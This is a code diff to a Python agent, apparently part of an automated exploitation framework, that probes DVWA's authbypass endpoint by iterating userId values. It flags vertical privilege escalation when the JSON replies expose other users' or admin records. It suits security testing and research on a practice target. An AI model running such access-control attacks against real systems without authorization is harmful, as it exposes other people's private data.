@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 import logging
 from typing import Any
 
@@ -10,11 +11,12 @@ from agents.state_utils import already_tried_payloads, candidate_payloads_for_st
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.session_manager import DVWASession
 from foundation.verifier import Verifier
+from agents.access_control.session import open_access_control_session, permission_evidence_fields, user_object_id
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "ac_vertical_escalation"
-MODULE_PATH = "/vulnerabilities/authbypass/"
+MODULE_PATH = "/vulnerabilities/authbypass/get_user_data.php"
 _PROBE_OBSERVATION_KEY = "role_based_access_present"
 
 # Signals indicating admin-level access or role logic flaw (probe stage)
@@ -58,11 +60,18 @@ def _probe_preconditions(
         tried.append(payload)
         try:
             test_id = payload.strip()
-            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
-            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, False, response=resp))
+            resp = session.get(MODULE_PATH, params={"userId": test_id})
+            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, False,
+                endpoint=MODULE_PATH, response=resp))
+            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
+                session._initial_session_fingerprint, object_id=user_object_id(test_id)))
             if resp.status_code == 200:
-                result = verifier.contains_any(resp.text, _ADMIN_SIGNALS)
-                if result.ok:
+                try:
+                    decoded = json.loads(resp.text)
+                    records = decoded if isinstance(decoded, list) else [decoded] if isinstance(decoded, dict) else []
+                except (TypeError, ValueError):
+                    records = []
+                if any(isinstance(record, dict) for record in records):
                     events[-1]["payload"].update(signal_detected=True, verified_grade=1, verification_reason="verified_probe_precondition")
                     observations[_PROBE_OBSERVATION_KEY] = True
                     return True, tried, observations, events
@@ -92,15 +101,28 @@ def _attempt_exploit(
         tried.append(payload)
         try:
             # Attempt to access admin user data
-            resp = session.get(MODULE_PATH, params={"userId": payload, "Submit": "Submit"})
-            events.append(exploit_event(AGENT_ID, f"userId={payload}", resp.status_code, True, response=resp))
-            if resp.status_code == 200:
-                result = verifier.contains_any(resp.text, _EXPLOIT_SIGNALS)
-                if result.ok:
-                    events[-1]["payload"].update(verified_grade=2, verification_reason="visibility_without_permission_oracle")
-                    score = max(score, 3)
-                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
-                    break
+            test_id = str(payload).strip()
+            resp = session.get(MODULE_PATH, params={"userId": test_id})
+            try:
+                decoded = json.loads(resp.text)
+                records = decoded if isinstance(decoded, list) else [decoded] if isinstance(decoded, dict) else []
+            except (TypeError, ValueError):
+                records = []
+            visible = resp.status_code == 200 and any(isinstance(record, dict)
+                and str(record.get("user_id", record.get("userId", record.get("id", "")))) == test_id
+                and (test_id != "1" or "admin" in " ".join(str(v) for v in record.values()).lower())
+                for record in records)
+            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, visible,
+                endpoint=MODULE_PATH, response=resp))
+            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
+                session._initial_session_fingerprint, object_id=user_object_id(test_id),
+                consumed_source_evidence_id=getattr(session, "_consumed_source_evidence_id", None)))
+            if visible:
+                events[-1]["payload"].update(signal_detected=True, verified_grade=3,
+                    verification_reason="verified_permission_candidate")
+                score = max(score, 3)
+                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
+                break
         except Exception as exc:
             logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
             events.append(exploit_event(AGENT_ID, f"userId={payload}", None, False))
@@ -129,14 +151,13 @@ def ac_vertical_escalation_agent(state: ExploitationState) -> dict[str, Any]:
     if not target_url:
         return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
 
-    session = DVWASession(target_url)
+    session = None
     try:
-        if not session.login():
-            return make_update(
-                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
-                failure_agents=[AGENT_ID],
-            )
-        session.set_security_level(security_level)
+        session, principal, initial_fingerprint, consumed_source_evidence_id = open_access_control_session(
+            state, AGENT_ID, security_level)
+        session._principal_id = principal
+        session._initial_session_fingerprint = initial_fingerprint
+        session._consumed_source_evidence_id = consumed_source_evidence_id
 
         already_tried = already_tried_payloads(state, AGENT_ID)
         confirmed_vulns: list[str] = []
@@ -201,4 +222,5 @@ def ac_vertical_escalation_agent(state: ExploitationState) -> dict[str, Any]:
             failure_agents=[AGENT_ID],
         )
     finally:
-        session.close()
+        if session is not None:
+            session.close()
